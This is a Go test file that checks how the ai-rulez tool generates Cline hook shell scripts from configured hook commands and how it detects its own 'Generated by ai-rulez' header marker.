func TestClineWrapperGroupsEveryCommand(t *testing.T) {
	captureWarnings(t)
	cfg := &config.Config{BaseDir: t.TempDir(), Hooks: []config.HookGroup{
		{Event: "PreToolUse", Hooks: []config.HookAction{
			{Command: "cd sub && ./check # trailing comment"}, {Script: "scripts/two.sh"},
		}},
	}}

	scripts := settings.ClineHookScripts(cfg)

	require.Len(t, scripts, 1)
	body := scripts[0].Body
	assert.Contains(t, body, "printf '%s\\n' \"$input\" | { cd sub && ./check # trailing comment\n} >/dev/null || exit $?\n")
	assert.Contains(t, body, "printf '%s\\n' \"$input\" | { \"$root\"/'scripts/two.sh'\n}\n")
	assert.Contains(t, body, "input=$(head -c ")
	assert.NotContains(t, body, "$(cat)")
}

func TestClineOwnershipMarkerIsAnchoredToTheHeader(t *testing.T) {
	cfg := &config.Config{BaseDir: t.TempDir(), Hooks: []config.HookGroup{
		{Event: "Stop", Hooks: []config.HookAction{{Command: "echo x"}}},
	}}
	generated := settings.ClineHookScripts(cfg)[0].Body
	tests := []struct {
		name string
		body string
		want bool
	}{
		{"generated", generated, true},
		{"hand-written mentioning the marker in a comment", "#!/bin/sh\necho hi\n# Generated by ai-rulez\n", false},
		{"marker only in the first line", "# Generated by ai-rulez\n", false},
		{"marker on a later line", "#!/bin/sh\n# note\n# Generated by ai-rulez (Stop hook)\n", false},
		{"empty", "", false},
		{"crlf header", "#!/bin/sh\r\n# Generated by ai-rulez (Stop hook): x\r\n", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.want, settings.IsClineHookGenerated([]byte(tt.body)))
		})
	}
}

